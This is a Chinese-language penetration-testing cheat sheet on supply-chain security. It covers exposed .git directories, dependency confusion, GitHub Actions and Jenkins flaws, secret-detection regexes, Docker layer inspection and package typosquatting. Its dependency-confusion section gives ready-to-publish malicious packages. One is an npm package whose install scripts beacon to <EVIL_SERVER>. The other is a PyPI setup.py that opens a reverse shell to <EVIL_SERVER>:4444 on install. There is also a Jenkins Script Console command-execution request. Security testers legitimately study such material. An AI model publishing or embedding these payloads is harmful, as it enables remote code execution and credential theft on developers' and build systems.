# 供应链与开发安全测试实战参考

> 覆盖: Git泄露 → 依赖混淆攻击 → CI/CD管道 → 硬编码密钥 → Docker镜像 → NPM/PyPI投毒
> 定位: 与 SecSkills-main 互补，SecSkills 不覆盖供应链安全

---

## 1. Git 泄露检测与利用

### 1.1 检测 .git 泄露

```bash
# 检测标准路径
curl -s -o /dev/null -w "%{http_code}" https://<target>/.git/HEAD
curl -s -o /dev/null -w "%{http_code}" https://<target>/.git/config
curl -s -o /dev/null -w "%{http_code}" http://<target>/.git/HEAD

# 自动化工具: GitHack / git-dumper
# GitHack (Python)
python3 GitHack.py https://<target>/.git/
# git-dumper
./git_dumper.sh https://<target>/.git/ ./repo

# 手工恢复
curl -s https://<target>/.git/HEAD
curl -s https://<target>/.git/logs/HEAD
curl -s https://<target>/.git/refs/heads/master

# 恢复文件
curl -s "https://<target>/.git/objects/ab/cdef12345..." | zlib_decompress
```

### 1.2 敏感文件/目录泄露

```bash
# 常见敏感文件
curl -s https://<target>/.env
curl -s https://<target>/.env.production
curl -s https://<target>/.env.local
curl -s https://<target>/config.json
curl -s https://<target>/config.js
curl -s https://<target>/credentials.json
curl -s https://<target>/service-account.json
curl -s https://<target>/id_rsa
curl -s https://<target>/backup.zip
curl -s https://<target>/dump.sql
curl -s https://<target>/robots.txt.disallow

# 批量检测
for f in .env .env.production .env.local config.json config.js credentials.json id_rsa backup.zip dump.sql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://<target>/$f")
  echo "$f → $status"
done
```

### 1.3 Git 历史中的密钥提取

```bash
# 如果 .git 可读，提取所有提交中的敏感信息
# 使用 truffleHog / gitleaks
docker run --rm -v "$PWD:/repo" trufflesecurity/trufflehog filesystem /repo/
gitleaks detect --source ./repo -v

# 手工提取
cd repo
git log --all --oneline
git show <COMMIT_HASH> | grep -i "key\|secret\|password\|token\|api"
git log -p --all | grep -E "(AKIA|SECRET|password|token)" | head -20
```

### 1.4 Git 仓库元数据

```bash
# 获取仓库信息
git ls-remote https://<target>/.git/

# 如果开启了 Git HTTP 智能协议
curl -s "https://<target>/.git/info/refs?service=git-upload-pack" | strings

# 仓库描述
curl -s https://<target>/.git/description
```

---

## 2. 依赖混淆攻击 (Dependency Confusion)

### 2.1 原理与检测

```bash
# 原理: 私有包名与公共仓库中的包名冲突
# 构建工具优先从公共仓库拉取同名包
# 攻击者注册与内部包同名的公共包名，可执行任意代码

# 检测: 从 package.json / requirements.txt / pom.xml 找私有包
# 通常有 @company/ 前缀或是非公开注册表的包
grep -r '"@company/' --include="package.json" --include="*.js" .
grep -r "name.*internal\|name.*private" --include="*.json" .
grep -r "private.*true" --include="package.json" .
```

### 2.2 NPM 依赖混淆投毒

```bash
# 1. 从 package.json 提取包名
# 2. 区分公共包 vs 私有包
# 3. 在 npm registry 中搜索同名包 (搜索不到 → 可注册)

# 自动化: npm-check / dep-confusion-scanner
npm view <PACKAGE_NAME>
# 如果返回 404 → 可注册

# 4. 创建恶意包
mkdir malicious-pkg
cd malicious-pkg
# 创建 package.json
cat << 'EOF' > package.json
{
  "name": "@company/internal-lib",
  "version": "9999.9.9",
  "description": "POC dependency confusion",
  "main": "index.js",
  "scripts": {
    "preinstall": "node preinstall.js"
  },
  "postinstall": "node postinstall.js"
}
EOF

# 创建 postinstall 脚本
cat << 'EOF' > index.js
const http = require('http');
http.get('http://<EVIL_SERVER>/pwned?p=' + process.env.PWD);
module.exports = {};
EOF

cp index.js postinstall.js
cp index.js preinstall.js

# 5. 发布到公共 npm
npm publish --registry https://registry.npmjs.org/
```

### 2.3 PyPI 依赖混淆

```bash
# 从 requirements.txt / setup.py 找私有包
cat requirements.txt | grep -E "@|git\+|--index-url|--extra-index-url"

# 检查包是否在 PyPI 上
pip install <PACKAGE>-== 2>/dev/null
# 或
curl -s https://pypi.org/pypi/<PACKAGE>/json | jq .info.name

# 创建恶意 PyPI 包
cat << 'EOF' > setup.py
from setuptools import setup
import os, socket, subprocess

# 安装时执行的反向 shell
s = socket.socket()
s.connect(("<EVIL_SERVER>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

setup(
    name="company-internal-lib",
    version="9999.9.9",
    packages=[],
)
EOF

# 发布
python3 setup.py sdist
twine upload dist/*
```

### 2.4 Ruby Gem / Maven 混淆

```bash
# Ruby Gem
gem fetch <PACKAGE_NAME> 2>/dev/null || echo "NOT IN PUBLIC REGISTRY"

# Maven (Java)
# 从 pom.xml 中找 <groupId> 和 <artifactId>
# 检查 https://search.maven.org/search?q=<ARTIFACT>
```

---

## 3. CI/CD 管道漏洞

### 3.1 GitHub Actions 漏洞

```bash
# 1. pull_request_target 滥用
# 如果 workflow 用 pull_request_target，攻击者 PR 中的代码在
# 目标仓库上下文中执行，可访问 Secrets

# 检测: 查看 .github/workflows/*.yml
grep -r "pull_request_target" .github/workflows/
grep -r "issue_comment" .github/workflows/

# 2. 第三方 Action 注入
# 检查 workflows 中使用的第三方 Action
# 如果引用了 @master 而不是固定 commit hash → 可被注入

# 3. 环境变量泄露
# GITHUB_TOKEN 自动注入到 workflow 中
# 默认权限: 可写入当前仓库
env | grep GITHUB
env | grep SECRET
env | grep TOKEN

# 4. 日志中的 Secret 泄露
# GitHub 自动 redact, 但某些格式可绕过
# 例如: base64 编码、拆分、echo ${{ secrets.xxx }}
```

### 3.2 Jenkins 漏洞

```bash
# 未授权访问
curl -s http://<target>:8080/
# /script (Groovy Console)
curl -s http://<target>:8080/script

# Jenkins Script Console RCE
curl -s -X POST "http://<target>:8080/script" \
  --data "script=println 'id'.execute().text"

# 常见端点
curl -s http://<target>:8080/computer/api/json  # 节点信息
curl -s http://<target>:8080/credentials/        # 凭据列表
curl -s http://<target>:8080/job/                # Job 列表

# secrets 提取 (需要 View 权限)
curl -s http://<target>:8080/job/<JOB>/config.xml/api/json
```

### 3.3 CI/CD 凭据泄露

```bash
# 从构建日志中提取
# 检查 artifact 中的配置
# 检查 test 输出

# GitHub Actions Self-Hosted Runner
# 如果可以在自托管 Runner 上执行代码
cat ~/.ssh/ 2>/dev/null
cat /etc/ssl/private/ 2>/dev/null
env | grep -i "key\|secret\|password\|token"
```

---

## 4. 硬编码密钥/Token 检测

### 4.1 常用检测模式

```bash
# grep 检测常见密钥格式
grep -r -P '(?i)(?:api[_-]?key|api[_-]?secret|client[_-]?secret|secret|password|token)\s*[:=]\s*["'"'"']?[A-Za-z0-9_/=+.-]{16,}["'"'"']?' .

# AWS Key
grep -r -P 'AKIA[0-9A-Z]{16}' .

# GitHub Token
grep -r -P '(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}' .

# JWT
grep -r -P 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' .

# Private Key
grep -r -P '-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----' .

# Google Service Account
grep -r -P '"type": "service_account"' .
```

### 4.2 使用 truffleHog 扫描

```bash
# 扫描远程仓库
trufflehog https://github.com/<ORG>/<REPO>.git

# 扫描本地目录
trufflehog filesystem ./repo

# 扫描组织所有公开仓库
trufflehog github --org=<ORG>
```

---

## 5. Docker 镜像漏洞分析

### 5.1 镜像层分析

```bash
# 导出镜像层
docker save <IMAGE> -o image.tar
tar -xvf image.tar
# 查看 json 和层 tar

# 每一层执行
cat <LAYER_HASH>/json | jq .  # 查看层命令
tar -tvf <LAYER_HASH>/layer.tar | grep -E "\.env|config|key|secret|password"

# 提取所有层中的敏感文件
for layer in */layer.tar; do
  echo "=== $layer ==="
  tar -xf "$layer" -O etc/shadow 2>/dev/null && echo "SHADOW FOUND in $layer"
  tar -xf "$layer" -O root/.ssh/id_rsa 2>/dev/null && echo "SSH KEY in $layer"
  tar -xf "$layer" -O .env 2>/dev/null && echo "ENV FILE in $layer"
done
```

### 5.2 漏洞扫描

```bash
# Trivy — 快速镜像扫描
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image <IMAGE>

# Grype
grype <IMAGE>

# Docker Scout (需 Docker Hub 订阅)
docker scout quickview <IMAGE>
```

### 5.3 入口点注入

```bash
# 修改 Dockerfile ENTRYPOINT 注入后门
# 或者修改 entrypoint.sh
docker run --entrypoint sh <IMAGE> -c "id"

# 查看默认入口
docker inspect <IMAGE> | jq '.[0].Config.Entrypoint'
docker inspect <IMAGE> | jq '.[0].Config.Cmd'
```

---

## 6. NPM/PyPI 投毒识别

### 6.1 识别可疑包

```bash
# 检查包是否有可疑行为
# 1. 安装脚本 (preinstall/postinstall)
npm view <PACKAGE> scripts
npm pack <PACKAGE> && tar -xzf <PACKAGE>-*.tgz && cat package/package.json

# 2. 依赖数量突然增加
npm view <PACKAGE> versions --json | tail -5

# 3. 作者与包名不符
npm view <PACKAGE> maintainers

# 4. 最近才更新但下载量巨大 (Typo-squatting)
npm search typosquat <PACKAGE>
```

### 6.2 常见 Typo-squatting 模式

```bash
# 常见手法:
# package → packge / pakage / packaje
# lodash → lodashs / lodsh
# express → expres / exress
# react → reaact / reactt

# 使用专门工具检测
npx can-i-hijack <PACKAGE>  # 检查是否可劫持
npx hijack <PACKAGE>

# 检查你的依赖是否已被投毒
npm audit
npm audit --json | jq '.vulnerabilities[] | select(.severity == "critical")'
```

### 6.3 缓存投毒 (Cache Poisoning)

```bash
# npm 缓存投毒 — 如果 CI 使用缓存
# 攻击者控制缓存 → 注入恶意包

# pip 缓存投毒
# 检查 ~/.cache/pip/ 中的 .whl 文件
ls -la ~/.cache/pip/http/
```

---

## 速查表

| 场景 | 检测命令 | 预期结果 |
|------|----------|---------|
| Git 泄露 | `curl <target>/.git/HEAD` | 200 + ref 信息 |
| 依赖混淆 | `npm view <PKG>` | 404 → 可注册 |
| CI Secret 泄露 | `env \| grep TOKEN` | CI 中可读 Token |
| 硬编码密钥 | `grep -r AKIA[0-9A-Z]{16} .` | AWS Key |
| Docker 敏感文件 | `tar -xf layer.tar .env 2>/dev/null` | 环境变量文件 |
| Typo-squatting | `npm view <PKG> maintainers` | 可疑作者 |

---

*参考: trufflesecurity.com, owasp.org, npmjs.com | 依赖混淆需确认目标公司私有包范围*
